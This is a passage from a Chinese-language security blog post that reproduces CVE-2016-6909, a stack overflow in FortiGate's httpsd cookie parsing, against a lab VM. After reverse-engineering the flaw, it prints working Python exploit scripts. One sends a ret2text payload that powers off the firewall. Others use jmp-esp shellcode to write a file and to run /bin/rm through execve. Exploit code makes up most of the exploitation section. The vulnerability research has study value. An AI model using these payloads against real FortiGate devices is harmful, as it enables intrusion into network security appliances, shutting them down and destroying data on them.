<p>但是这里没能够成功获得一个 shell，初步猜测是 EGREGIOUSBLUNDER 的版本问题</p>
<p>使用 wireshark 截取 EGREGIOUSBLUNDER 所发送的数据包进行分析，我们可以发现 <code>0xbffff114</code> 这个地址被布置到了http请求头的 Cookie 中的 <code>AuthHash</code> 字段，初步推测这应当是作为一个返回地址被布置上去的，说明可能是一个栈溢出漏洞，这也与 CVE 通告所说的【cookie 解析过程中发生缓冲区溢出】相吻合</p>
<p><img src="https://i.loli.net/2021/08/12/nKClEmcT15JAQot.png" alt="image.png"></p>
<p>使用 postman 简单仿造该 http 请求如下，使用字符 <code>A</code> 简单填充 AuthHash 字段：</p>
<p><img src="https://i.loli.net/2021/08/12/XetkB3iWlKNaqjg.png" alt="image.png"></p>
<p>当我们的字符 A 数量达到 0x60 时再一次发生了 crash，不过这一次的栈回溯更为详细</p>
<p><img src="https://i.loli.net/2021/08/12/ZHqku5i3BED8QlR.png" alt="image.png"></p>
<p>为了方便构造 payload 进行利用，接下来笔者选择使用 python 发送 http 请求</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line">url = <span class="string">&#x27;http://192.168.116.100/index&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Length&#x27;</span>:<span class="string">&#x27;12&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip,deflate,br&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;PostmanRuntime/7.28.3&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;192.168.116.100&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;APSCOOKIE_3943997904=Era=0&amp;Payload=ëYÿáèøÿÿÿPQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&amp;AuthHash=&#x27;</span> + <span class="string">&#x27;A&#x27;</span> * <span class="number">0x60</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">r = post(url, headers = headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>(r.headers)</span><br></pre></td></tr></table></figure>

<h2 id="定位溢出点"><a href="#定位溢出点" class="headerlink" title="定位溢出点"></a>定位溢出点</h2><blockquote>
<p>由于一些特殊原因，笔者本地无法直接启动其 init 程序</p>
<p>笔者本想将 gdb 等打包进其文件系统中直接在虚拟机内进行调试，奈何文件系统实在太老，重打包后没有一次启动成功的，只好作罢…</p>
</blockquote>
<p>我们首先根据这个报错信息进行栈回溯：</p>
<p><img src="https://i.loli.net/2021/08/12/ZHqku5i3BED8QlR.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:08C38A77                 call    sub_8C389B7</span><br><span class="line">.text:08C38A7C                 mov     ebx, [ebp+var_4]</span><br><span class="line">.text:08C38A7F                 leave</span><br><span class="line">.text:08C38A80                 retn</span><br><span class="line">.text:08C38A80 sub_8C38A61     endp</span><br></pre></td></tr></table></figure>

<p>找到 <code>sub_8C389B7()</code> 函数，我们发现其最终会调用 <code>sub_8C38440()</code> 函数，简单分析我们不难知道该调用链仅仅是用于打印报错信息</p>
<p><img src="https://i.loli.net/2021/08/12/NYucT3GlibfU8dW.png" alt="image.png"></p>
<p>继续分析其调用链，libc offset 0x1d218 处代码如下，该段代码位于 libc 中函数 <code>__libc_sigaction()</code>，用以进行 <code>sigreturn</code> 系统调用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:0001D210 loc_1D210:                              ; DATA XREF: __libc_sigaction+CA↓o</span><br><span class="line">.text:0001D210                 mov     eax, 0ADh</span><br><span class="line">.text:0001D215                 int     80h             ; LINUX - sys_rt_sigreturn</span><br><span class="line">.text:0001D217                 nop</span><br><span class="line">.text:0001D218 loc_1D218:                              ; DATA XREF: __libc_sigaction+D9↓o</span><br><span class="line">.text:0001D218                 pop     eax</span><br><span class="line">.text:0001D219                 mov     eax, 77h ; &#x27;w&#x27;</span><br><span class="line">.text:0001D21E                 int     80h             ; LINUX - sys_sigreturn</span><br></pre></td></tr></table></figure>

<p>继续回溯，<code>0x8204F8D</code> 的上一条指令调用了 <code>sub_820483B()</code> 函数，通过逆向我们发现该函数会调用 <code>sub_820429D()</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_820429D</span><span class="params">(<span class="type">int</span> *a1, _BYTE *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> **v4; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> *v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">void</span> *v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v8; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> *v11[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v10 = sub_83297EE(*a1, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a2 || (a2 = (_BYTE *)sub_8329B12(a1[<span class="number">34</span>], <span class="string">&quot;Cookie&quot;</span>)) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( *a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v11[<span class="number">0</span>] = (<span class="type">char</span> *)sub_8344CBA(*a1, &amp;a2, <span class="number">59</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v11[<span class="number">0</span>] )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">while</span> ( ((*__ctype_b_loc())[(<span class="type">unsigned</span> __int8)*a2] &amp; <span class="number">0x2000</span>) != <span class="number">0</span> )</span><br><span class="line">        ++a2;</span><br><span class="line">      v2 = (<span class="type">const</span> <span class="type">char</span> *)sub_8344CBA(*a1, v11, <span class="number">61</span>);</span><br><span class="line">      v3 = (<span class="type">const</span> <span class="type">char</span> *)sub_8204B9C(a1);</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v2, v3) )</span><br><span class="line">        sub_820CB5E(v11[<span class="number">0</span>]);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>其中 <code>sub_8329B12()</code> 函数调用了 <code>strcasecmp()</code>，大致分析应当是判断字符串存在性的函数，在这里传入的参数中包含字符串 <code>&quot;Cookie&quot;</code>，那么我们大致可以推测该函数应当是 httpsd （即本进程）中被用以处理 Cookie 相关的函数之一</p>
<p>局部变量 v3 的求解涉及到函数 <code>sub_8204B9C()</code>，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_8204B9C</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( nCfg_debug_zone )</span><br><span class="line">    v1 = nCfg_debug_zone + <span class="number">45972</span>;</span><br><span class="line">  v2 = sub_8204B37(v1);</span><br><span class="line">  <span class="keyword">return</span> sub_8329797(*a1, (<span class="type">int</span>)<span class="string">&quot;%s_%lu&quot;</span>, <span class="string">&quot;APSCOOKIE&quot;</span>, v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们不难发现其最后调用的 <code>sub_8329797()</code> 传参形式应当是按格式化字符串进行解析，最终拼凑出来的形式应当如 <code>APSCOOKIE_114514</code> （示例数字）的形式，而上层调用中使用 <code>strstr()</code> 判断 v3 在 v2 中是否存在，这个形式我们与我们传入的 Cookie 的内容开头相吻合，由此我们可以推断出接下来的 <code>sub_820CB5E()</code> 函数应当涉及到对 Cookie 的解析工作</p>
<p>接下来继续分析 <code>sub_820CB5E()</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_820CB5E</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">108</span>]; <span class="comment">// [esp+116Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  size = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">    size = <span class="built_in">strlen</span>(a1) + <span class="number">1</span>;</span><br><span class="line">  src = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x52</span>u);</span><br><span class="line">  v16 = <span class="number">20</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v21, <span class="number">0</span>, <span class="keyword">sizeof</span>(v21));</span><br><span class="line">  ptr = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_820C6F0();</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">sscanf</span>(a1, <span class="string">&quot;Era=%1d&amp;Payload=%[^&amp;]&amp;AuthHash=%s&quot;</span>, &amp;v17, v21, s) == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>做 pwn 的同学应该<strong>第一眼就能够看到一个大大的 %s 映入你的眼帘，十分明显的一个栈溢出</strong>，我们的漏洞便位于这个位置：对 Cookie 内容的解析使用了不安全的 <code>%s</code> 读取 AuthHash 到栈上从而使得其存在栈溢出漏洞</p>
<blockquote>
<p>这个年代还有针对 <code>%s</code> 的漏洞属实令人泪目</p>
</blockquote>
<h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><p>httpsd 为对 init 的软链接，首先我们先对 init 程序进行安全检查：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec ./init</span></span><br><span class="line">[*] &#x27;/home/arttnba3/Desktop/cves/CVE-2016-6909/exploit/init&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">    RPATH:    b&#x27;../lib:../ulib:/fortidev/lib:/lib&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>保  护  全  关</strong>，我们有相当大的操作空间</p>
<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>由于其与传统 pwn 题的交互界面不同，我们只有一次 post 的机会，所以需要在这一次 post 中<strong>一  步  到  位</strong>，相应地，虽然我们无法通过交互获取 libc，但是在 init 文件中有着大量的 gadget，又没开 PIE，故直接 ret2text 即可</p>
<p>先试一下我们是否真的能直接控制程序执行流，随便找一段 gadget 简单试一下，笔者这里选用了一段关机代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:080601AE                 push    4321FEDCh       ; howto</span><br><span class="line">.text:080601B3                 call    _reboot</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>reboot(RB_POWER_OFF)</code></p>
</blockquote>
<p>http 请求头的长度毫无疑问能够满足我们对 payload 的要求，故笔者这里直接使用大量的 <code>ret</code> 指令作为 slide code，省去计算溢出长度的必要：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#e = ELF(&#x27;./init&#x27;)</span></span><br><span class="line">url = <span class="string">&#x27;http://192.168.116.100/index&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Length&#x27;</span>:<span class="string">&#x27;12&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip,deflate,br&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;PostmanRuntime/7.28.3&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;192.168.116.100&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;APSCOOKIE_3943997904=Era=0&amp;Payload=ëYÿáèøÿÿÿPQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&amp;AuthHash=&#x27;</span> + <span class="string">&#x27;\x1c\x8d\x04\x08&#x27;</span> * <span class="number">100</span> + <span class="string">&#x27;\xae\x01\x06\x08&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">r = post(url, headers = headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>(r.headers)</span><br></pre></td></tr></table></figure>

<p>可以发现 fortigate VM 被成功关机：</p>
<blockquote>
<p>好像没啥意义的截图（）</p>
</blockquote>
<p><img src="https://i.loli.net/2021/08/13/NDWXjeBoVsZla8U.png" alt="image.png"></p>
<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>ROP链的拼接较为繁琐，且对于 <code>%s</code> 而言<strong>空白字符无法被捕获</strong>，由于没有开启 NX 保护，我们可以考虑通过<code>jmp esp</code> 的 gadget 来<strong>直接执行 shellcode</strong></p>
<p>当然，有的功能其实还是可以直接使用 init 文件中存在的函数的，比如说 open 和 write</p>
<p><img src="https://i.loli.net/2021/08/14/fr8sKmHFYdP6u5R.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/08/14/KDIwvXnT2OCMGsi.png" alt="image.png"></p>
<p>下面这段代码调用了 open 进行了文件的创建并向文件内写入了字符串 <code>arttnba3</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#e = ELF(&#x27;./init&#x27;)</span></span><br><span class="line">url = <span class="string">&#x27;http://192.168.116.100/index&#x27;</span></span><br><span class="line"></span><br><span class="line">cookie = <span class="string">&#x27;&#x27;</span></span><br><span class="line">cookie += <span class="string">&#x27;APSCOOKIE_3943997904=Era=0&amp;Payload=ëYÿáèøÿÿÿPQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&amp;AuthHash=&#x27;</span></span><br><span class="line">cookie += <span class="string">&#x27;\x1c\x8d\x04\x08&#x27;</span> * <span class="number">100</span> <span class="comment"># ret</span></span><br><span class="line">cookie += <span class="string">&#x27;\xf7\xbd\x96\x08&#x27;</span> <span class="comment"># add eax, ebp ; jmp esp</span></span><br><span class="line"><span class="comment"># following are shellcode</span></span><br><span class="line">cookie += <span class="string">&#x27;\x90&#x27;</span> * <span class="number">0x80</span> <span class="comment"># slide code nop</span></span><br><span class="line">cookie += <span class="string">&#x27;1\xc0PhflagTXjBP\xbb$\xe3\x05\x08\xff\xd31\xc9Qhnba3harttT[j\x08SP\xbb\x84\xb5\x05\x08\xff\xd3&#x27;</span> <span class="comment"># &#x27;xor eax, eax ; push eax ; push 0x67616c66 ; push esp ; pop eax ; push 0102 ; push eax ; mov ebx, 0x805E324 ; call ebx ; xor ecx, ecx ; push ecx ; push 0x3361626e ; push 0x74747261 ; push esp ; pop ebx ; push 8 ; push ebx ; push eax ; mov ebx, 0x805B584 ; call ebx&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Length&#x27;</span>:<span class="string">&#x27;12&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip,deflate,br&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;PostmanRuntime/7.28.3&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;192.168.116.100&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>:cookie</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">r = post(url, headers = headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>(r.headers)</span><br></pre></td></tr></table></figure>

<p>发送 http 请求，我们成功地在防火墙内创建文件并写入特定内容</p>
<p><img src="https://i.loli.net/2021/08/14/yWfmvxl4DKPBGc1.png" alt="image.png"></p>
<p>下列 shellcode 通过系统调用 execve 调用 <code>/bin/rm</code> 删除我们的 flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cookie += <span class="string">&#x27;1\xc0Ph//rmh/binT[PhflagTYPQSTY\x89\xc2@@@@@@@@@@@\xcd\x80&#x27;</span> <span class="comment"># &#x27;xor eax, eax ; push eax ; push 0x6d722f2f ; push 0x6e69622f ; push esp ; pop ebx ; push eax ; push 0x67616c66 ; push esp ; pop ecx ; push eax ; push ecx ; push ebx ; push esp ; pop ecx ; mov edx, eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; int 0x80&#x27;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>发送 http 请求，可以看到 flag 文件已被删除</p>
<p><img src="https://i.loli.net/2021/08/14/I2PUGYa5TSoXuvN.png" alt="image.png"></p>
<p>接下来我们便可以使用自己构造的 shellcode 为所欲为了，网上也有很多 shellcode 生成工具，这里笔者便不再独立贴出其他 shellcode 了</p>
<h1 id="0x03-What’s-more…"><a href="#0x03-What’s-more…" class="headerlink" title="0x03.What’s more…"></a>0x03.What’s more…</h1><p>安全产品是为了确保安全而引入的，但安全产品又会有新的安全问题，这个时候又要引入新的安全产品来确保安全产品的安全，然后便是无限套娃…</p>
<p>笔者认为，<strong>「安全问题本质上还是人的问题」</strong>，只有我们每一位开发者都真正重视起安全问题，很多没有必要的损失才能得以避免</p>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2021/08/03/CVE-0X02-CVE-2017-5123/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>上一页</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
